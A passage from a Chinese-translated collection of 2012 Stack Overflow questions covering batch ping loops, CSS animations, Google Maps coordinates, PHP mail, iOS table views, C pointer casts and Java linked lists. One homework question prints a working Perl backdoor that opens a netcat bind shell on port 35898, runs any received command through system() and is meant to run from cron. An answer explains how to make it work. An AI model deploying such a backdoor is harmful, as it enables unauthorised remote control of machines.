你们太棒了，这很完美！再次感谢您花时间解释问题并提供答案:)

```
FOR /F "eol=;" %%i in (ip.txt) do for /f "tokens=9" %%p in ('ping %%i -n 3 -w 1000^|find "Average"^|^|echo . . . . . . . . ERROR') do echo Result: %%p 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-25T03:48:41.710

这是预期的行为。DO 子句每输出一行执行一次，而 FIND 命令只输出匹配该子句的行，因此只有至少有一行匹配该子句时才会执行 DO 子句。

你可以尝试这样的事情：

```
set result=No Response
FOR /F "tokens=*" %X in ('ping 1.1.1.1 -n 1 -w 1000^|FIND "Average"') do set result=%X
echo Result: %result% 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T05:29:43.453

Harry Johnston is 100% correct, the behavior you are seeing is exactly as expected. When you PING an invalid address the FIND command is not producing any output so there is nothing to iterate!

You need to modify the IN() clause so that the invalid addresses still produce output. I see 2 simple solutions:

1) Use FINDSTR instead of FIND and search for "Average" and "100% loss". If there are more than 9 tokens then it is an error situation. For this demo I embedded the IP addresses in the script.

```
@echo off
for %%I in (8.8.8.8 1.1.1.1) do for /f "tokens=9,10" %%A in (
   'ping %%I -n 3 -w 1000^|findstr /c:"Average" /c:"100%% loss"'
) do if "%%B" neq "" (echo %%I  ERROR) else echo %%I  %%A 
```

and here is some sample output:

```
8.8.8.8  37ms
1.1.1.1  ERROR 
```

2) Use the `||` operator to conditionally echo a line if FIND fails

```
for %%I in (8.8.8.8 1.1.1.1) do for /f "tokens=9" %%A in (
    'ping %%I -n 3 -w 1000^|find "Average"^|^|echo . . . . . . . . ERROR'
) do echo %%I  %%A 
```

The output is the same as for the 1st code.

It is also trivial to extend Harry's solution to support a list of IPs. Simply reset the result variable before the inner loop.

```
setlocal enableDelayedExpansion 
for %%I in (8.8.8.8 1.1.1.1) do (
  set "result=ERROR"
  for /f "tokens=9" %%A in (
      'ping %%I -n 3 -w 1000^|find "Average"'
  ) do set "result=%%A"
  echo %%I  !result!
) 
```

Again, the output is the same.

# css - 停止 CSS 动画但让其当前迭代完成

> ID：13061209
> 
> 赞同：31
> 
> 时间：2012-10-25T03:40:46.103
> 
> 标签：css, animation

我有以下 HTML：

```
<div class="rotate"></div>​ 
```

以及以下 CSS：

```
@-webkit-keyframes rotate {
  to { 
    -webkit-transform: rotate(360deg);
  }
}
.rotate {
    width: 100px;
    height: 100px;
    background: red;
    -webkit-animation-name:             rotate;
    -webkit-animation-duration:         5s;
    -webkit-animation-iteration-count:  infinite;
    -webkit-animation-timing-function:  linear;
}​ 
```

我想知道是否有办法（使用 JavaScript）来停止动画，但让它完成当前的迭代（最好通过更改一个或几个 CSS 属性）。我尝试设置`-webkit-animation-name`一个空白值，但这会导致元素以一种不和谐的方式跳回其原始位置。我也尝试过设置`-webkit-animation-iteration-count`，`1`但它做同样的事情。

* * *

## 回答 #1

> 赞同：36
> 
> 时间：2012-10-25T04:27:13.160

收到`animationiteration`事件后停止动画。像这样的东西（使用jQuery）：

**CSS**

```
@-webkit-keyframes rotate {
  to {
    -webkit-transform: rotate(360deg);
  }
}
.rotate {
    width: 100px;
    height: 100px;
    background: red;
}
.rotate.anim {
    -webkit-animation-name:             rotate;
    -webkit-animation-duration:         5s;
    -webkit-animation-iteration-count:  infinite;
    -webkit-animation-timing-function:  linear;
} 
```

**HTML**

```
<div class="rotate anim">TEST</div>
<input id="stop" type="submit" value="stop it" /> 
```

**JS (JQuery)**

```
$("#stop").click(function() {
    $(".rotate").one('animationiteration webkitAnimationIteration', function() {
        $(this).removeClass("anim");
    });
}); 
```

小提琴：http: [//jsfiddle.net/sSYYE/1/](http://jsfiddle.net/sSYYE/1/)

请注意，我在`.one`这里使用（不是`.on`），以便处理程序只运行一次。这样，动画可以稍后重新启动。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-03-03T09:03:38.200

您的意思是您希望动画在结束时停止在原处而不跳回其原始位置？

然后你想要：

***动画从一个地方移动到另一个地方并让它停留在那里：animation-fill-mode:forwards;***

检查此链接：

[http://www.w3schools.com/cssref/css3_pr_animation-fill-mode.asp](http://www.w3schools.com/cssref/css3_pr_animation-fill-mode.asp)

# charts - Rickshaw - js 图表库：需要字符串而不是轴上的数字

> ID：13061214
> 
> 赞同：1
> 
> 时间：2012-10-25T03:41:35.960
> 
> 标签：charts, d3.js, javascript

我正在使用人力车（[http://code.shutterstock.com/rickshaw/](http://code.shutterstock.com/rickshaw/)）并希望在图形的一个轴上而不是数字上有字符串。有可能这样做吗？如果是这样，怎么做？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T09:32:07.310

可以定义和使用您自己的格式化程序

```
Rickshaw.Fixtures.Number.myFormat =  (y) ->
  if (y == val)
    return 'somestring';
  else
    return ''some other string'; 
```

将此用作：

```
yAxis = new Rickshaw.Graph.Axis.Y
  graph: graph
  tickFormat: Rickshaw.Fixtures.Number.myFormat

graph.render() 
```

# google-maps - 谷歌地图地理坐标不起作用

> ID：13061215
> 
> 赞同：0
> 
> 时间：2012-10-25T03:41:54.190
> 
> 标签：google-maps, coordinate

我正在尝试使用谷歌地图坐标在第三方网站的 XML 提要中使用，它应该创建地图本身。我使用 URL [http://maps.google.com/maps/geo?q=hong%20kong&output=json&oe=utf8&sensor=false](http://maps.google.com/maps/geo?q=hong%20kong&output=json&oe=utf8&sensor=false)（单击此链接无效，但复制和粘贴有效）。这给了我点坐标 114.1094970 和 22.3964280。如果我将这些坐标直接放入谷歌地图，它们就不起作用，那我做错了什么？

我的函数本身的代码如下，但这似乎是谷歌地图的固有问题，而不是我的代码：

```
function getLatandLong($add)
{ 
$url = 'http://maps.google.com/maps/geo?q='.urlencode($add).'&output=json&oe=utf8&sensor=false';
$data = @file_get_contents($url);
$jsondata = json_decode($data,true);

if(is_array($jsondata )&& $jsondata ['Status']['code'] == 200){
  $output['lat'] = $jsondata ['Placemark'][0]['Point']['coordinates'][0];
  $output['lng'] = $jsondata ['Placemark'][0]['Point']['coordinates'][1];
 }

    return $output;
} 
```

任何帮助将非常感激！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T03:48:55.990

这些坐标是正确的，并且可以在 Google 地图中使用。

我猜这是因为您以错误的顺序传递它们：
您需要首先放置纬度坐标，因为
`22.396428 114.109497`
不是
`114.109497 22.396428`

实际上，在查看代码片段时，您会错误地解析它们：JSON 数据首先具有经度，其次具有纬度……因此，代码应为：

```
 $output['lat'] = $jsondata ['Placemark'][0]['Point']['coordinates'][1];
  $output['lng'] = $jsondata ['Placemark'][0]['Point']['coordinates'][0]; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-27T16:02:28.483

您可以使用谷歌地图地理坐标的 jquery 移动应用程序示例：

* * *

[jsfiddle-google-maps-地理坐标](http://jsfiddle.net/yakirmanor/wzcAZ/)

或在此处使用自定义图像：[jsfiddle-google-map-with-images](http://jsfiddle.net/yakirmanor/CzkfG/)

头是：

```
<link rel="stylesheet" href="http://code.jquery.com/mobile/1.2.0/jquery.mobile-1.2.0.min.css" />
<!--link rel="stylesheet" href="/Content/jquery-mobile-responsive.css" /-->
<script src="http://code.jquery.com/jquery-1.8.3.min.js"></script>
<script src="http://code.jquery.com/mobile/1.2.0/jquery.mobile-1.2.0.min.js"></script>
<script src="http://maps.google.com/maps/api/js?sensor=true&language=en"></script>
<script>
    $(document).bind("mobileinit", function () {
        $.mobile.ajaxEnabled = false;
    });

    $(Start);

    function Start() {
        $("#google_map .ui-collapsible-heading").click(function () {
            var locations = [
              ['<br/>Main Office', 31.590496, 34.561981, 4],
              ['Sensor 16<br/>User Name: 16_DE-1R', 31.590595, 34.562980, 5],
              ['Sensor 17<br/>User Name: 17_TEN-2MP', 31.590694, 34.563979, 3],
              ['Sensor 18<br/>User Name: 18_TEN-2MP', 31.590793, 34.564978, 2],
            ];

            var map = new google.maps.Map(document.getElementById('googleMap'), {
                zoom: 17,
                center: new google.maps.LatLng(31.590892, 34.561977),
                mapTypeId: google.maps.MapTypeId.ROADMAP
            });

            var infowindow = new google.maps.InfoWindow();

            var marker, i;

            for (i = 0; i < locations.length; i++) {
                marker = new google.maps.Marker({
                    position: new google.maps.LatLng(locations[i][3], locations[i][2]),
                    map: map
                });

                google.maps.event.addListener(marker, 'click', (function (marker, i) {
                    return function () {
                        infowindow.setContent(locations[i][0]);
                        infowindow.open(map, marker);
                    }
                })(marker, i));
            }
        });
    }
</script> 
```

与身体：

```
<div data-role="page" class="type-interior">
<div data-role="header" data-theme="a">
    <a data-icon="back" href="#" rel="external">Back</a>
    <h1>Sensor</h1>
</div>
<div data-role="content">
    <div class="content-primary">
        <h2>Sensor: 16</h2>
            <div data-role="collapsible-set">
                <div id="google_map" data-role='collapsible' data-collapsed=true data-theme="b" data-content-theme="d">
                    <h1>Sensor Map</h1>
                    <div id="googleMap" style="width:100%; height:300px;"></div>
                </div>
            </div>    
        <ul data-role="listview" data-inset="true" data-theme="b">
            <li data-role="list-divider"></li>                
            <li><a href="#" rel="external">Configure Comm</a></li>
            <li><a href="#" rel="external">Measurements</a></li>
            <li><a href="#" rel="external">Users</a></li>
        </ul>
    </div>
    <div class="content-secondary">
        <div data-role="collapsible" data-collapsed="true" data-theme="b" data-content-theme="d">
                <h3>More Options</h3>
                <ul data-role="listview" data-theme="c" data-dividertheme="d">
                    <li data-role="list-divider">Actions</li>
                    <li><a href="/Home/UserList?back=Index" rel="external">Add User</a></li>
                    <li><a href="#" rel="external">Edit Sensor</a></li>
                    <li><a href="#" rel="external">Delete Sensor</a></li>
                </ul>
        </div>
    </div>
</div>
<div data-role="footer" data-theme="a">
    <h4>Mobile</h4>
</div> 
```

# perl - Perl 脚本调用自身（通过 nc -e）失败。声称没有这样的文件/目录

> ID：13061216
> 
> 赞同：-1
> 
> 时间：2012-10-25T03:42:01.833
> 
> 标签：perl, security, system-calls, netcat

我们被要求在受害机器上设置后门来完成家庭作业。我已经获得了对机器的访问权限，并且我希望在 a 上运行以下脚本`cron`，但它会引发错误。

`@ARGV`我已经通过使用和不使用虚拟参数独立调用程序来验证测试是否正常工作`run`，但是当我在初始化脚本后尝试`netcat`进入受害者机器时`port 35898`，以下错误是我在连接时得到的所有错误。

**错误：** `exec /bin/vshell run failed : No such file or directory`

显然程序存在是因为程序在调用自己。

**代码：**

```
#!/usr/bin/perl -w

$| = 1;
my $prompt = '$ ';

# run is just a dummy arg
if(!@ARGV){ exec("nc -e '/bin/vshell run' -l -p 35898"); die; }

while(1){
  print $prompt;
  eval {
    local $SIG{ALRM} = sub { die 'Goodbye!\n'; };

    alarm 60;
    &syscall;
    alarm 0;
  };
  if( $@ ){ die; }
}

sub syscall{
  if( defined( $_ = <STDIN> )){
    chomp;
    system( $_ );
  }
} 
```

我已经有一段时间了，我真的可以朝正确的方向轻推。谢谢！

PS：这个安装`nc`是用允许`-e`标志的安全漏洞编译的，我已经在其他程序上验证了这个功能。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-25T03:51:32.383

" `/bin/vshell`" 可能存在，但 " `/bin/vshell run`" 不存在。显然，`nc`的`-e`值必须是要执行的文件的路径。

创建一个包含

```
#!/bin/sh
exec /bin/vshell run 
```

并将路径传递给它。

# tinymce - 在 asp.net 网站上使用 TinyMCE Editor 的优缺点是什么？

> ID：13061217
> 
> 赞同：1
> 
> 时间：2012-10-25T03:42:02.333
> 
> 标签：tinymce

我一直在阅读[TinyMCE 编辑器](http://www.tinymce.com/)如何成为一个很好的所见即所得编辑器。这可以在 asp.net (vb) 网站上使用，如果可以，优缺点是什么？

# linq-to-xml - 使用 Linq 查询 XDocument 不断抛出 Null 指针异常

> ID：13061221
> 
> 赞同：0
> 
> 时间：2012-10-25T03:42:20.100
> 
> 标签：linq-to-xml

如何使用 Linq 查询 xml 文档？当我使用“where”子句下面的代码时，抛出“对象引用未设置为对象的实例。”。具体来说，我认为节点为空。请帮忙！

我的 xml 看起来像这样：

```
<qbo:QboCompanyPreferences xmlns="http://www.intuit.com/sb/cdm/v2" xmlns:qbp="http://www.intuit.com/sb/cdm/qbopayroll/v1" xmlns:qbo="http://www.intuit.com/sb/cdm/qbo">
  <qbo:Preference>
    <Name>TaxAccountId</Name>
    <Value>34</Value>
  </qbo:Preference>
  <qbo:Preference>
    <Name>TaxPercent</Name>
    <Value>4.5%</Value>
  </qbo:Preference>
</qbo:QboCompanyPreferences> 
```

我正在使用这样的 XDocument：

```
XDocument doc = XDocument.Parse(serviceResponse);
string taxNodeName = "TaxPercent";
XNamespace qbo = "http://www.intuit.com/sb/cdm/qbo";

var Preference = (from node in doc.Descendants(qbo + "Preference")
                        where node.Element("Name").Value == taxNodeName
                        select node).FirstOrDefault();

Response.Write(Preference.ToString()); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-16T14:22:55.337

这可能已经处理了，但试试这个

```
XDocument doc = XDocument.Parse(serviceResponse);
string taxNodeName = "TaxPercent";
XNamespace qbo = "http://www.intuit.com/sb/cdm/qbo";
XNamespace ns = "http://www.intuit.com/sb/cdm/v2";

var Preference = (from node in doc.Descendants(qbo + "Preference")
                    where node.Element(ns+"Name").Value == taxNodeName
                    select node).FirstOrDefault();

Response.Write(Preference.ToString()); 
```

该节点不为空，但未找到该元素，因此`.Value`被调用`null`。

# email - 为什么没有收到我的 php 邮件？

> ID：13061225
> 
> 赞同：1
> 
> 时间：2012-10-25T03:42:37.827
> 
> 标签：email, iis, lotus-notes, php

我有一个简单的表格，我正在尝试在提交时发送一封电子邮件。我正在运行 XP Pro（这是工作中的一个副项目，而不是我的电脑），所以我已经启动并运行了 IIS，我安装了 Lotus Notes 客户端 6.5。我已经配置了我的 php.ini 文件以及我的 IIS。

```
$to = "recipientemail@xxx.com";
$subject = "Hi!";
$body = "Hi,\n\nHow are you?";
if (mail($to, $subject, $body)) {
echo("<p>Message successfully sent!</p>");
} else {
echo("<p>Message delivery failed...</p>");
} 
```

我的 php.ini

```
[mail function]
; For Win32 only.
; http://php.net/smtp
SMTP = MY.IP.MY.IP 
; http://php.net/smtp-port
smtp_port = 25

; For Win32 only.
; http://php.net/sendmail-from
sendmail_from = myemail@xxx.com 
```

我没有收到任何错误，它会回显 Message Sent，所以我不确定我哪里出错了。最初我将它设置为使用 localhost 但它不起作用，所以现在我只使用我在 IIS 设置中定义的 IP，我还在中继限制下定义了环回和我的 IP。我唯一的猜测是某些东西可能没有设置为正确使用 LN，比如它正在寻找 Outlook？另外我没有安装 pear 也不在乎使用它，也尝试了 PHPMailer 无济于事，我只想让它工作。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T04:10:26.920

如果 MY.IP.MY.IP 的服务器没有运行 SMTP 服务器（不是邮件客户端），那么您对 ​​mail() 的调用实际上不会执行任何操作。

如果您确实有一个有效的 SMTP 服务器，它很可能需要一个用户/通行证来接受您的任何邮件（或者这将是垃圾邮件发送者的开放中继）。例外情况通常是邮件服务器将接受来自本地主机的邮件作为受信任的邮件。

我不认为 php.ini 支持 SMTP AUTH 凭据，因此您可能想尝试 PEAR Mail 包并直接使用您已经拥有访问凭据的 SMTP 服务器发送。

[http://pear.php.net/package/Mail/](http://pear.php.net/package/Mail/)

# ios - 滚动 UITableView 有点生涩

> ID：13061226
> 
> 赞同：1
> 
> 时间：2012-10-25T03:42:38.607
> 
> 标签：ios

我有一个`UITableView`包含所有单元格的图像，但所有图像都已经在单元格上（我没有设置我自己的图像）并且它们都是从项目中包含的图像加载的。这些不是从服务器或任何东西加载的图像。但是，tableview 的滚动仍然有些生涩。有什么办法可以加快速度吗？我有在这里生成单元格的功能：

```
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath {
    // Post init, update with the fair info so it can attend/de-attend on its own
    CompaniesCustomCell *cell = [CompaniesCustomCell dequeOrCreateInTable:tableView];
    SectionInfo *sectionInfo = [sectionInfoArray objectAtIndex:indexPath.section];
    cell.fairDictionary = [sectionInfo.arrMDetails objectAtIndex:indexPath.row];
    [cell updateEventIcon:(NSString*)[[sectionInfo.arrMDetails objectAtIndex:indexPath.row] valueForKey:@"TYPE"]];

    cell.lblFairName.text = [[sectionInfo.arrMDetails objectAtIndex:indexPath.row] valueForKey:@"TITLE"];
    [cell setSelectionStyle:UITableViewCellSelectionStyleNone];

    // Set event start time, end time, and date
    NSString *newDate = [MyUtil convertToLocalTime:@"MMMM dd, yyyy" :[[sectionInfo.arrMDetails objectAtIndex:indexPath.row] valueForKey:@"START_TIME"]];        
    NSString *startString = [MyUtil convertToLocalTime:@"hh:mm a" :[[sectionInfo.arrMDetails objectAtIndex:indexPath.row] valueForKey:@"START_TIME"]];
    NSString *endString = [MyUtil convertToLocalTime:@"hh:mm a" :[[sectionInfo.arrMDetails objectAtIndex:indexPath.row] valueForKey:@"END_TIME"]];

    cell.lblFairDate.text = newDate;
    cell.lblFairStartTime.text = startString;
    cell.lblFairEndTime.text = endString;
    return cell;
} 
```

有什么我做错了可能会减慢它的速度吗？

**编辑**

我在`convertToLocalTime`这里包含了函数的代码，因为我认为这可能是根本原因。但是......我真的很困惑如何优化它。我正在从服务器获取时间戳值（以 UTC 为单位），并将其转换为用户本地时区。这个过程真的那么慢吗？

```
// Converts given time string into the users current timezone
// based on the location of their phone
+(NSString *)convertToLocalTime:(NSString*)format :(NSString*)stringDate {

    // Get the date in the servers time zone
    NSDate *date = [MyUtil convertToServerDate:stringDate];

    // Convert the date to the local timezone
    NSDateFormatter *localFormat = [[NSDateFormatter alloc] init];
    [localFormat setDateFormat:format];
    NSString *localDate = [localFormat stringFromDate:date];

    [localFormat release];
    return localDate;
}

// Provides a NSDate object with the servers timezone set
+(NSDate *)convertToServerDate:(NSString*)stringDate {

    // First get the NSDate object in the servers timezone
    NSTimeZone *tz = [NSTimeZone timeZoneWithName:ServerTimezone];
    NSDateFormatter *inFormat = [[NSDateFormatter alloc] init];
    [inFormat setDateFormat:@"yyyyMMddHHmmss"];
    [inFormat setTimeZone:tz];
    NSDate *date = [inFormat dateFromString:stringDate];

    [inFormat release];
    return date;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T15:41:35.653

就像 EarlyRiser 所说，检查您的日期实用程序代码。但是，由于它是类方法，因此您需要创建新对象。

要尝试的另一件事是让自定义单元类更改标签。您可以从设置 fairDictionary 开始执行此操作。我假设您在自定义单元格的 .h 中的 fairDictionary 上使用了 @property。

在自定义单元格的 .m 中覆盖 fairDictionary 的 set 方法，因此在 @synthesize 的顶部执行：

```
@synthesize fairDictionary = _fairDictionary; 
```

然后在 .m 文件的某处调用一个方法：

```
- (void)setFairDictionary:(NSDictionary *)fairDictionary {
_fairDictionary = fairDictionary;
[cell updateEventIcon:(NSString*)[_fairDictionary valueForKey:@"TYPE"];
self.lblFairName.text = [_fairDictionary valueForKey:@"TITLE"]; 
```

等等等等。所以不是表格数据源处理设置标题等。自定义类将在设置字典时进行。

希望这能有所帮助。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T04:02:16.910

我最近做了相当多的 UITableView 优化，你最好的朋友是时间分析工具。如果您不知道如何使用它，那么您应该学习，它是一个救生员。

这是一个[教程](http://www.cocoawithlove.com/2010/02/finding-cause-of-simple-performance.html)

您可能想要查看的一件事是您的日期实用程序代码。它在里面做什么？您是否每次调用它时都创建 NSCalendar 对象？这足以扼杀你的表现。但如果不进行分析，真的很难知道。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-16T08:23:14.957

我在这个问题上遇到了很多困难，所以我非常清楚你的问题。UITableView 很生涩？我很惊讶所有的答案都指向日期函数。你可以把所有的东西都拿出来，它仍然会很生涩。

为什么？这是惰性图像解压缩。即使所有图像都来自应用程序包，ios 也会在它显示在屏幕上的那一刻执行解压缩。您必须在后台线程中手动解压缩图像。

解压不仅仅意味着实例化一个 UIImage 对象。它可能有点复杂。最好的解决方案是下载 SDWebImage 并使用随附的图像解压缩器。

要了解有关此问题的更多信息，请参阅： http: [//www.cocoanetics.com/2011/10/avoiding-image-decompression-sickness/](http://www.cocoanetics.com/2011/10/avoiding-image-decompression-sickness/)

# c++ - 将 int 转换为指针时出现编译错误

> ID：13061230
> 
> 赞同：1
> 
> 时间：2012-10-25T03:43:42.613
> 
> 标签：c++, c

我需要帮助解决我遇到的编译错误。

错误是：错误：从不同大小的整数转换为指针 [-Werror=int-to-pointer-cast]

在下一行

```
PRINT_INDENT("Inode2 PTR: %p\n", (void *)ptr); 
```

语境

```
unsigned int ptr;
memcpy(&ptr, value, sizeof(ptr));
PRINT_INDENT("Inode2 PTR: %p\n", (void *)ptr);

#define PRINT_INDENT(...) ({int __j = indent_level; while (__j-- > 0) printf("  "); printf(__VA_ARGS__);}) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T03:48:00.030

你用的是32位的64位平台`int`吗？如果是这样，错误是不言自明的。`ptr`是一个 32 位变量，您将其转换为 64 位`void *`. 一种解决方法是首先将其转换为`unsigned long long`a 然后将结果转换为 a `void *`。

```
PRINT_INDENT("Inode2 PTR: %p\n", (void *)(unsigned long long)ptr); 
```

但是你为什么要这样做？为什么不直接打印`ptr`为 a`unsigned int`而不是将其转换为 a`void *`如下：

```
PRINT_INDENT("Inode2 PTR: %u\n", ptr); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T03:51:46.447

我不确定为什么需要将 int 转换为指针；如果目的只是打印指针，则可能没有必要。

但是，如果需要这种类型的转换，那么为了确保整数具有正确的大小，C++11 为无符号整数数据类型提供了一个别名，该数据类型足够大以容纳指针：

```
std::uintptr_t 
```

它在`cstdint`标题中定义（对于 C，C99 标准也定义了它`uintptr_t`）`stdint.h`。

使用它作为你的整数类型（或将现有的整数类型转换为这个 - 但请注意，如果原始类型更大，可能会丢失信息！）如果确实需要 int/pointer casts，则这是正确的方法。

请参阅相关问题：[什么是 uintptr_t 数据类型](https://stackoverflow.com/questions/1845482/what-is-uintptr-t-data-type)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-25T03:47:45.853

[`uintptr_t`](https://stackoverflow.com/questions/1845482/what-is-uintptr-t-data-type)如果你想做这种事情，你应该使用类型。它是 C99 和 C++11 标准中相对较新的类型。

不能保证整数足够大以保存指针值，实际上在具有 32 位整数和 64 位指针的 64 位平台上它们不是。

```
memcpy(&ptr, value, sizeof(ptr)); 
```

如果`value`是指针，该行将仅复制其 64 位值的一半。

# java - 使用“两层链接列表”创建数据库

> ID：13061231
> 
> 赞同：-1
> 
> 时间：2012-10-25T03:43:48.097
> 
> 标签：java, list, linked-list, abstract-data-type

尝试使用 ADT 为大学课程设置程序，该课程`Storm`使用多层 LinkedList 对对象进行分类。这是我需要做的。

1.  *使用两级链表来组织数据库中的信息。*
2.  *上层链表中的节点代表年份，每年一个节点。*
3.  *每个年份节点都将包含对该年风暴链接列表的引用。*

4.  *您应该按排序顺序维护每个链接列表中的项目，按年份排序上部列表（按数字顺序，从低到高），按名称排序下部列表（按标准字典顺序）。*

5.  *您可以在链表上使用您想要的任何变体；虚拟头节点、头/尾指针、双向链表等。*
6.  *您可以根据需要实现其他类以管理列表。*

谁能帮我完成这个？我很难过，并且已经努力思考这个问题。

这两个列表我已经有 4 个不同的类

*   年节点.java
*   年表.java
*   StormNode.java
*   StormList.java
*   Storm.java

这是代码：

**年节点.java**

```
 public class YearNode
{

        int year;
        YearNode next;
        StormNode sNext;

    public int getYear()
    {
        return year;
    }

    public StormNode getSNext()
    {
        return sNext;
    }

    public YearNode getNext()
    {
        return next;
    }

    public void setYear(int year)
    {
        this.year = year;
    }

    public void setNext(YearNode next)
    {
        this.next = next;
    }

    public void setSNext(StormNode next)
    {
        this.sNext = sNext;
    }
} 
```

**年表.java**

```
 public class YearList
{
    YearNode head;
    YearNode sHead;

    public YearList()
    {
        YearNode head = null;
        YearNode sHead = null;
    }

    public boolean isEmpty()
    {
        return(head == null);
    }

    public boolean isStormEmpty()
    {
        return(sHead == null);
    }

    public void setSList(StormNode node)
    {
        StormNode sHead = node;
    }

    public int size()
    {
        YearNode current = head;
        int counter = 0;
        while(current != null)
        {
            counter++;
            current = current.getNext();
        }
        return counter;
    }

    public int get(int index)
    {
        int size = size();
        YearNode current = head;

        if((index > size) || (index < 0))
        {
            throw new IndexOutOfBoundsException();
        }
        else
        {
            int counter = index;
            while(counter != 0)
            {
                current = current.getNext();
                counter--;
            }
            return current.getYear();
        }
    }

    public void add(int index, int year)
    {
        if((index < 0) || (index > size()))
        {
            throw new IndexOutOfBoundsException();
        }
        YearNode current = head;
        YearNode previous = null;
        while (index > 0)
        {
            index--;
            previous = current;
            current = current.getNext();
        }
        YearNode Splice = new YearNode();
        Splice.setYear(year);
        Splice.setNext(current);
        if(previous == null)
        {
            head = Splice;
        }
        else
        {
            previous.setNext(Splice);
        }
    }

    public int remove(int index)
    {
        if((index < 0) || (index > size()))
        {
            throw new IndexOutOfBoundsException();
        }
        YearNode current = head;
        YearNode previous = null;
        while (index > 0)
        {
            index--;
            previous = current;
            current = current.getNext();
        }
        if(previous == null)
        {
            head = current.getNext();
        }
        else
        {
            previous.setNext(current.getNext());
        }

        return current.getYear();

    }

    public void removeAll()
    {
            head = null;
    }
} 
```

**StormNode.java**

```
 public class StormNode
{

        Storm storm;
        StormNode next;

    public Storm getStorm()
    {
        return storm;
    }

    public StormNode getNext()
    {
        return next;
    }

    public void setStorm(Storm storm)
    {
        this.storm = storm;
    }

    public void setNext(StormNode next)
    {
        this.next = next;
    }
} 
```

**StormList.java**

```
 public class StormList
{
    StormNode head;

    public StormList()
    {
        StormNode head = null;
    }

    public StormNode getHead()
    {
        return head;
    }

    public boolean isEmpty()
    {
        return(head == null);
    }

    public int size()
    {
        StormNode current = head;
        int counter = 0;
        while(current != null)
        {
            counter++;
            current = current.getNext();
        }
        return counter;
    }

    public Object get(int index)
    {
        int size = size();
        StormNode current = head;
        if((index >= size) || (index < 0))
        {
            throw new IndexOutOfBoundsException();
        }
        else
        {
            int counter = index;
            while(counter != 0)
            {
                current = current.getNext();
                counter--;
            }
            return current.getStorm();
        }
    }

    public void add(int index, Storm Storm)
    {
        if((index < 0) || (index > size()))
        {
            throw new IndexOutOfBoundsException();
        }
        StormNode current = head;
        StormNode previous = null;
        while (index > 0)
        {
            index--;
            previous = current;
            current = current.getNext();
        }
        StormNode Splice = new StormNode();
        Splice.setStorm(Storm);
        Splice.setNext(current);
        if(previous == null)
        {
            head = Splice;
        }
        else
        {
            previous.setNext(Splice);
        }
    }

    public Object remove(int index)
    {
        if((index < 0) || (index > size()))
        {
            throw new IndexOutOfBoundsException();
        }
        StormNode current = head;
        StormNode previous = null;
        while (index > 0)
        {
            index--;
            previous = current;
            current = current.getNext();
        }
        if(previous == null)
        {
            head = current.getNext();
        }
        else
        {
            previous.setNext(current.getNext());
        }

        return current.getStorm();

    }

    public void removeAll()
    {
            head = null;
    }
} 
```

**Storm.java**

```
 public class Storm{

      private int year; //
      private String name;
      private int startDay;
      private int endDay;
      private int category; 

      public Storm(int year, String name, int startDay, int endDay, int category){
         this.year = year;
         this.name = name;
         this.startDay = startDay;
         this.endDay = endDay;
         this.category = category;

      }

      public Storm()
      {
         this.year = 0;
         this.name = "";
         this.startDay = 0;
         this.endDay = 0;
         this.category = 7;
      }

      public String getName()
      {
         return this.name;
      }

      public int getYear()
      {
         return this.year;
      }

        public int getStartDay()
      {
         return this.startDay;
      }

        public int getEndDay()
      {
         return this.endDay;
      }

        public int getCategory()
      {
         return this.category;
      }

      public String getFormattedStartDay()
      {
            String startDayReturn = "";
            if (this.startDay == 9999)
                {
                    startDayReturn = "(no start)";
                }
            else
                {   
                 int startDayDigit1 = (this.startDay / 1000) % 10;
                 int startDayDigit2 = (this.startDay / 100) % 10;
                 int startDayDigit3 = (this.startDay / 10) % 10;
                 int startDayDigit4 = this.startDay % 10;

                 startDayReturn = (startDayDigit1 + startDayDigit2 + "/" + startDayDigit3 + startDayDigit4);
                }
         return startDayReturn;
      }

      public String getFormattedEndDay()
      {
         String endDayReturn = "";
         if(this.endDay == 9999)
         {
            endDayReturn = "(no end)";
         }
         else
         {
            int endDayDigit1 = (this.endDay / 1000) % 10;
            int endDayDigit2 = (this.endDay / 100) % 10;
            int endDayDigit3 = (this.endDay / 10) % 10;
            int endDayDigit4 = this.endDay % 10;

            endDayReturn = (endDayDigit1 + endDayDigit2 + "/" + endDayDigit3 + endDayDigit4);
         }
         return endDayReturn;
      }

      public String getFormattedCategory()
      {
         int cat = this.category;
         String categoryReturn = "";
         switch(cat){
            case 0:
               categoryReturn = "Tropical Storm";
               break;
            case 1:
               categoryReturn = "Hurricane Level 1";
               break;
            case 2:
               categoryReturn = "Hurricane Level 2";
               break;
            case 3:
               categoryReturn = "Hurricane Level 3";
               break;
            case 4:
               categoryReturn = "Hurricane Level 4";
               break;
            case 5:
               categoryReturn = "Hurricane Level 5";
               break;
            case 6:
               categoryReturn = "Hurricane Level 6";
               break;
            default:
               categoryReturn = "no info";
               break;
         }

         return categoryReturn; 

      }

   } 
```

很抱歉。谢谢你的帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T05:32:39.840

> 我不明白如何将链接列表附加到另一个链接列表。

您将 type 的成员以及 getter 和 setter 方法添加`StormList`到 class 。`YearNode`您还可以添加一个方便的方法`YearNode#addStorm(StormNode sn)`，将 . 添加`StormNode`到包含的`StormList`.

# critical-section - 集群环境中的临界区

> ID：13061233
> 
> 赞同：1
> 
> 时间：2012-10-25T03:43:52.597
> 
> 标签：critical-section

